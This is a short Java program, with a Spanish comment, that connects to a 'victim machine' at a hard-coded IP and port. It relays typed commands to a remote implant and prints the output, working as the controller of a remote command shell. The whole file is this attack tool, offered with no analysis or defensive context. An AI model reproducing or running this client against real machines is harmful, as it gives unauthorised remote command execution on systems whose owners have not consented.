import java.io.*;
import java.net.*;

public class codigo {

    public static void main(String[] args) throws IOException {
        String serverAddress = "192.168.0.20"; // Aquí poner la IP del servidor o máquina víctima.
        int port = 8080;
        try (Socket socket = new Socket(serverAddress, port);
             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
             PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
             BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in))) {

            String serverResponse = in.readLine();
            System.out.println("Server: " + serverResponse);

            String userInput;
            while ((userInput = stdIn.readLine()) != null) {
                out.println(userInput);
              
                while (true) {
                    String line = in.readLine();
                    if (line.equals("EndOfOutput") || line.equals("EndOfCdCommand")) {
                        break;
                    }
                    System.out.println(line);
                }

                if (userInput.equalsIgnoreCase("exit")) {
                    break;
                }
            }
        }
    }
}
